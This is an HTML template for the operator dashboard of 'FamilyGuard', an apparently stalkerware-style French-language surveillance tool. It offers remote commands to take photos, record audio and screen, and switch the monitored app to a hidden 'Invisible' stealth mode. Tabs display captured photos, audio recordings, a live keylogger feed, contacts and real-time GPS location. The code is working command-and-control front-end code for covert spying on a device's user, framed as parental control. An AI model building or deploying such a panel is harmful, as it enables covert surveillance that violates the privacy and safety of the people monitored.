<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FamilyGuard | Control Center</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        :root {
            --primary: #6366f1;
            --primary-hover: #4f46e5;
            --bg-dark: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.7);
            --text-main: #f8fafc;
            --text-dim: #94a3b8;
            --accent: #22d3ee;
            --danger: #ef4444;
            --success: #22c55e;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--bg-dark); color: var(--text-main); display: flex; min-height: 100vh; overflow-x: hidden; }

        .sidebar { width: 260px; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); border-right: 1px solid rgba(255, 255, 255, 0.1); padding: 2rem; position: fixed; height: 100vh; z-index: 100; }
        .logo { font-size: 1.5rem; font-weight: 800; color: var(--primary); margin-bottom: 2.5rem; display: flex; align-items: center; gap: 10px; }
        .nav-item { padding: 0.8rem 1rem; border-radius: 12px; color: var(--text-dim); text-decoration: none; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 12px; transition: 0.3s; cursor: pointer; }
        .nav-item:hover, .nav-item.active { background: rgba(99, 102, 241, 0.15); color: var(--text-main); }

        .main-content { margin-left: 260px; flex: 1; padding: 2rem; }
        header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem; }

        .dashboard-grid { display: grid; grid-template-columns: repeat(12, 1fr); gap: 1.5rem; }
        .card { background: var(--card-bg); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 1.5rem; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
        
        .col-8 { grid-column: span 8; }
        .col-4 { grid-column: span 4; }
        .col-12 { grid-column: span 12; }

        #map { height: 400px; border-radius: 15px; }

        /* Media Gallery */
        .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 1rem; margin-top: 1rem; }
        .media-item { position: relative; border-radius: 12px; overflow: hidden; border: 1px solid rgba(255,255,255,0.1); cursor: pointer; transition: 0.3s; }
        .media-item:hover { transform: scale(1.05); }
        .media-item img { width: 100%; height: 150px; object-fit: cover; }
        .media-label { position: absolute; bottom: 0; background: rgba(0,0,0,0.7); width: 100%; padding: 4px; font-size: 0.7rem; text-align: center; }

        /* Audio Player */
        .audio-list { display: flex; flex-direction: column; gap: 10px; }
        .audio-item { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 10px; display: flex; align-items: center; gap: 15px; }
        audio { height: 30px; filter: invert(1); }

        /* Logs */
        .logs-box { height: 300px; overflow-y: auto; background: rgba(0,0,0,0.3); border-radius: 12px; padding: 1rem; font-family: monospace; font-size: 0.9rem; }
        .log-line { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05); border-left: 3px solid transparent; padding-left: 8px; }
        .log-line.key { border-left-color: var(--accent); }
        .log-line.pos { border-left-color: var(--success); }

        /* Tabs */
        .tab-content { display: none; animation: fadeIn 0.4s; }
        .tab-content.active { display: block; }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* Device Status Indicator */
        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; background: #94a3b8; margin-right: 5px; }
        .status-dot.online { background: var(--success); box-shadow: 0 0 10px var(--success); }

        .btn-cmd { background: var(--primary); color: white; border: none; padding: 10px 15px; border-radius: 10px; cursor: pointer; transition: 0.2s; font-size: 0.9rem; }
        .btn-cmd:hover { background: var(--primary-hover); transform: translateY(-2px); }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="logo"><i class="fas fa-shield-halved"></i> FamilyGuard</div>
        <div class="nav-item active" onclick="showTab('tab-main')"><i class="fas fa-home"></i> Général</div>
        <div class="nav-item" onclick="showTab('tab-media')"><i class="fas fa-images"></i> Photos & Vidéos</div>
        <div class="nav-item" onclick="showTab('tab-audio')"><i class="fas fa-microphone"></i> Écoutes Audio</div>
        <div class="nav-item" onclick="showTab('tab-keys')"><i class="fas fa-keyboard"></i> Keylogger</div>
        <div class="nav-item" onclick="showTab('tab-contacts')"><i class="fas fa-address-book"></i> Contacts</div>
    </div>

    <div class="main-content">
        <header>
            <div>
                <h1>Centre de Surveillance</h1>
                <p id="deviceStatusText" style="color: var(--text-dim);"><span class="status-dot" id="statusDot"></span> Appareil : <span id="currentDevice">En attente...</span></p>
            </div>
            <select id="deviceSelect" class="btn-cmd" style="background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);">
                {% for device in devices %}
                <option value="{{ device }}">{{ device }}</option>
                {% endfor %}
            </select>
        </header>

        <!-- TAB: MAIN / DASHBOARD -->
        <div id="tab-main" class="tab-content active">
            <div class="dashboard-grid">
                <div class="card col-8">
                    <div id="map"></div>
                </div>
                <div class="card col-4">
                    <h3>Commandes Rapides</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px;">
                        <button class="btn-cmd" onclick="sendCommand('take_photo')"><i class="fas fa-camera"></i> Photo</button>
                        <button class="btn-cmd" onclick="sendCommand('record_audio')"><i class="fas fa-microphone"></i> Audio</button>
                        <button class="btn-cmd" onclick="sendCommand('start_screen_record')"><i class="fas fa-video"></i> Écran</button>
                        <button class="btn-cmd" onclick="sendCommand('sync_logs')"><i class="fas fa-sync"></i> Logs</button>
                        <button class="btn-cmd" onclick="sendCommand('enable_stealth')" style="background: var(--danger);"><i class="fas fa-ghost"></i> Invisible</button>
                        <button class="btn-cmd" onclick="sendCommand('disable_stealth')" style="background: var(--success);"><i class="fas fa-eye"></i> Visible</button>
                    </div>
                </div>
                <div class="card col-12">
                    <h3>Activité Récente</h3>
                    <div class="logs-box" id="activityLogs"></div>
                </div>
            </div>
        </div>

        <!-- TAB: MEDIA / PHOTOS -->
        <div id="tab-media" class="tab-content">
            <div class="card">
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <h3>Photos Capturées</h3>
                    <button class="btn-cmd" onclick="refreshPhotos()"><i class="fas fa-redo"></i> Actualiser</button>
                </div>
                <div class="media-grid" id="photoGallery"></div>
            </div>
        </div>

        <!-- TAB: AUDIO -->
        <div id="tab-audio" class="tab-content">
            <div class="card">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                    <h3>Enregistrements Audio</h3>
                    <button class="btn-cmd" onclick="refreshAudio()"><i class="fas fa-redo"></i> Actualiser</button>
                </div>
                <div class="audio-list" id="audioList"></div>
            </div>
        </div>

        <!-- TAB: KEYLOGGER -->
        <div id="tab-keys" class="tab-content">
            <div class="card">
                <h3>Frappes Clavier en Direct</h3>
                <div class="logs-box" id="keyloggerBox" style="height: 500px; background: #000;"></div>
            </div>
        </div>

        <!-- TAB: CONTACTS -->
        <div id="tab-contacts" class="tab-content">
            <div class="card">
                <h3>Répertoire Téléphonique</h3>
                <div id="contactsList" style="margin-top: 15px;"></div>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
        var marker = L.marker([0, 0]).addTo(map);

        function showTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.currentTarget.classList.add('active');

            if (tabId === 'tab-media') refreshPhotos();
            if (tabId === 'tab-audio') refreshAudio();
            if (tabId === 'tab-keys') refreshKeys();
            if (tabId === 'tab-contacts') refreshContacts();
        }

        const deviceId = document.getElementById('deviceSelect').value;
        const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
        const ws = new WebSocket(`${protocol}://${location.host}/ws/${deviceId}`);

        ws.onopen = () => {
            document.getElementById('statusDot').classList.add('online');
            document.getElementById('currentDevice').textContent = deviceId + " (En ligne)";
        };

        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            const logBox = document.getElementById('activityLogs');
            const line = document.createElement('div');
            line.className = 'log-line';

            if (data.type === 'child_position') {
                marker.setLatLng([data.lat, data.lng]);
                map.setView([data.lat, data.lng], 15);
                line.className += ' pos';
                line.innerHTML = `<i class="fas fa-location-arrow"></i> Position mise à jour : ${data.lat}, ${data.lng}`;
            } else if (data.type === 'keystroke') {
                line.className += ' key';
                line.innerHTML = `<i class="fas fa-keyboard"></i> Saisie clavier : ${data.content}`;
            }

            logBox.prepend(line);
        };

        function sendCommand(action) {
            const dev = document.getElementById('deviceSelect').value;
            const fd = new FormData();
            fd.append('device_id', dev);
            fd.append('action', action);
            fetch('/admin/command', { method: 'POST', body: fd });
        }

        async function refreshPhotos() {
            const dev = document.getElementById('deviceSelect').value;
            const res = await fetch(`/admin/photos/${dev}`);
            const json = await res.json();
            const gallery = document.getElementById('photoGallery');
            gallery.innerHTML = '';
            json.photos.forEach(p => {
                gallery.innerHTML += `<div class="media-item"><img src="/static/photos/${p}"><div class="media-label">${p}</div></div>`;
            });
        }

        async function refreshAudio() {
            const dev = document.getElementById('deviceSelect').value;
            const res = await fetch(`/admin/audio/${dev}`);
            const json = await res.json();
            const list = document.getElementById('audioList');
            list.innerHTML = '';
            json.audios.forEach(a => {
                list.innerHTML += `<div class="audio-item"><i class="fas fa-file-audio"></i> <span>${a}</span><audio controls src="/static/audio/${a}"></audio></div>`;
            });
        }

        async function refreshKeys() {
            const dev = document.getElementById('deviceSelect').value;
            const res = await fetch(`/admin/keystrokes/${dev}`);
            const json = await res.json();
            const box = document.getElementById('keyloggerBox');
            box.innerHTML = '';
            json.data.forEach(s => {
                const d = document.createElement('div');
                d.className = 'log-line key';
                d.textContent = s.content;
                box.appendChild(d);
            });
        }

        async function refreshContacts() {
            const dev = document.getElementById('deviceSelect').value;
            const res = await fetch(`/admin/contacts/${dev}`);
            const json = await res.json();
            const list = document.getElementById('contactsList');
            if (json.status === 'success') {
                list.innerHTML = '<table style="width:100%; border-collapse: collapse;">' + 
                    json.data.contacts.map(c => `<tr style="border-bottom:1px solid #334155; padding:10px;"><td style="padding:10px;">${c.name}</td><td style="color:var(--accent)">${c.phone}</td></tr>`).join('') + 
                    '</table>';
            }
        }
    </script>
</body>
</html>
